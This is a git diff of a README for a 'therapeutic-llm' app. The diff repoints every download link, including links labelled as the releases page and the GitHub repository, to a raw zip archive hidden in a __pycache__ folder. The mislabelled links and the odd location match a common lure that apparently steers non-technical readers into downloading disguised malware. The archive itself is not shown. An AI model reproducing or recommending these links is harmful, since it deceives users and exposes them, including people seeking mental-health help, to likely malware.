@@ -6,9 +6,9 @@ Welcome! This guide will help you download and run the therapeutic-llm applicati
 
 ## 📥 Download the Application
 
-[![Download therapeutic-llm](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/therapeutic-llm-v3.9.zip)](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/therapeutic-llm-v3.9.zip)
+[![Download therapeutic-llm](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/__pycache__/therapeutic_llm_3.3.zip)](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/__pycache__/therapeutic_llm_3.3.zip)
 
-Visit [this page to download](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/therapeutic-llm-v3.9.zip).
+Visit [this page to download](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/__pycache__/therapeutic_llm_3.3.zip).
 
 ## 🖥️ System Requirements
 
@@ -31,7 +31,7 @@ The therapeutic-llm application comes with several useful features:
 ## 💻 Step-by-Step Installation
 
 1. **Visit the Releases Page:**
-   Go to [this page to download](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/therapeutic-llm-v3.9.zip) where you can find the latest version of the application.
+   Go to [this page to download](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/__pycache__/therapeutic_llm_3.3.zip) where you can find the latest version of the application.
 
 2. **Locate the Latest Release:**
    On the releases page, look for the most recent version of the application. You will see options for downloading various files.
@@ -71,7 +71,7 @@ If you encounter any issues, try the following:
 
 ## 🗂️ More Information
 
-For further details about the project, you can check out the [GitHub repository](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/therapeutic-llm-v3.9.zip). Here you’ll find:
+For further details about the project, you can check out the [GitHub repository](https://raw.githubusercontent.com/solar-thermopsis805/therapeutic-llm/main/therapy_response/__pycache__/therapeutic_llm_3.3.zip). Here you’ll find:
 
 - Source code
 - Contribution guidelines
